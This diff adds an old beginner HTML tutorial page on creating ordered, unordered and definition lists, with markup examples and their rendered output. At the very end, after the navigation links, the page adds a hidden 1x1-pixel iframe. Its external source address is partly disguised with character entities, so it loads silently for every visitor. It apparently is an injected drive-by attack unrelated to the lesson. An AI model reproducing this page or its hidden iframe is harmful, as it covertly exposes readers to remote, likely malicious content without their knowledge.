@@ -1,0 +1,103 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 7: Creating Lists</TITLE>
+</HEAD>
+
+<BODY>
+<H2>Lesson 7: Creating Lists</H2>
+
+We've just about learned everything there is to know about text formatting, but there's still one very important thing that we have to learn: Lists. <p>
+
+Lists are everywhere. We post them on our refrigerators and take them to the grocery store. Lists are a very efficient way to organize information. Naturally, HTML has a few tags to help you make lists. HTML has not 1, not 2, but <i>3</i> different types of lists that you can add to your pages! They are the <b>ordered</b>, <b>unordered</b>, and <b>definition</b> lists.<p>
+
+Ordered lists are exactly what the name implies: lists that follow a numerical order. Ordered lists begin with the &#60;OL&#62; tag and end with a &#60;/OL&#62; tag. When we want to put an item into this list, we need to put a &#60;LI&#62;, or <i>list item</i> tag before that item.<p>
+
+Here's an example of the ordered list syntax:<p>
+
+What do I need from the store today?&#60;p&#62;<p>
+
+&#60;OL&#62;<BR>
+    &#60;LI&#62;Bread<BR>
+    &#60;LI&#62;Cheese<BR>
+    &#60;LI&#62;Milk<BR>
+    &#60;LI&#62;Butter<BR>
+&#60;/OL&#62;<p>
+
+And heres how it looks to our viewers:<p>
+
+What do I need from the store today?<p>
+
+<OL>
+<LI>Bread
+<LI>Cheese
+<LI>Milk
+<LI>Butter
+</OL><p>
+
+Sure thing, but what if we do'nt want our list items to be numbered? That's when we use <i>Unordered Lists</i>. These are also called <i>Bulleted Lists</i>. Bulleted lists begin with the &#60;UL&#62; tag, and end with the &#60;/UL&#62; tag. They look exactly like ordered lists, except the item numbers are replaced with special characters called <i>bullets</i>. Here's an example of how bulleted lists are used:<p>
+
+The Tutorial Underground is:&#60;p&#62;<p>
+
+&#60;UL&#62;<BR>
+    &#60;LI&#62;Cool!<BR>
+    &#60;LI&#62;Free!<BR>
+    &#60;LI&#62;Informative!<BR>
+&#60;/UL&#62;<p>
+
+And here's how it would look to Joe Browser (our viewer!):<p>
+
+The Tutorial Underground is:<p>
+
+<UL>
+<LI>Cool!
+<LI>Free!
+<LI>Informative!
+</UL><p>
+
+Think that's cool? Try adding the <i>TYPE</i> attribute to the UL tag! With the TYPE attribute, we can change the type of bullet that we want to use! The TYPE attribute takes three arguments: "disc", "square" or "circle". So our new &#60;UL&#62; tag with a circle bullet would look like this: &#60;UL TYPE="circle"&#62;. The TYPE attribute can also be used in the &#60;OL&#62; tag to change from numbers to letters (capital[TYPE="A"] or small[TYPE="a"]), or roman numerals (uppercase[TYPE="I"] or lowercase[TYPE="i"]). If we want to make an ordered list with uppercase roman numerals, it looks like this:<p>
+
+&#60;OL TYPE="I"&#62;<p>
+
+The &#60;LI&#62; tag also has an attribute: <i>VALUE</i>. With the VALUE attrbute, we can change the value of a list item! Take a guess, what result would the following code result in:<p>
+
+&#60;OL TYPE="A"&#62;<BR>
+&#60;LI VALUE="2"&#62;Think hard now!<BR>
+&#60;/OL&#62;<p>
+
+If you guessed "B. Think hard now!" you're right? Why? Check out the combination of the TYPE and VALUE attributes!<p>
+
+Heres a little trick: we can start an ordered list with any number (or letter, if we use TYPE) with the START attribute. It looks like this:<p>
+
+&#60;OL START="3"&#62;<BR>
+&#60;LI&#62;This is item number 3!
+&#60;/OL&#62;<p>
+
+And to our viewers at home, it looks like this:<p>
+
+<OL START="3">
+<LI>This is item number 3!
+</OL>
+
+The last list that we can use is the <i>Definition List</i>. Definition lists are normally used when we need to define terms. The definition list starts with the &#60;DL&#62; tag and ends with the &#60;/DL&#62; tag. Each term to be defined in a definition list uses the &#60;DT&#62; or <i>Definition Term</i> tag. Every definition in a definition list needs a &#60;DD&#62;, or <i>I do'nt know what DD stands for :)</i> tag in front of it. It probably looks alot like this:<p>
+
+&#60;DL&#62;<BR>
+&#60;DT&#62;HTML    &#60;DD&#62;Hypertext Markup Language<BR>
+&#60;DT&#62;XML     &#60;DD&#62;eXtensible Markup Language<BR>
+&#60;/DL&#62;<p>
+
+Our friend Joe Browser see's it like this:<p>
+
+<DL>
+<DT>HTML    <DD>Hypertext Markup Language
+<DT>XML     <DD>eXtensible Markup Language
+</DL><p>
+
+Note that you can create really cool effects if you use the formatting tags inside of lists. It's really neat when you have Bold terms and Italic definitions (in my opinion anyway)!<p>
+
+Great! Now we can list all our family members and their cats on our page! What's next? <A HREF="lesson8.html">Click here for the next lesson!</A><p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
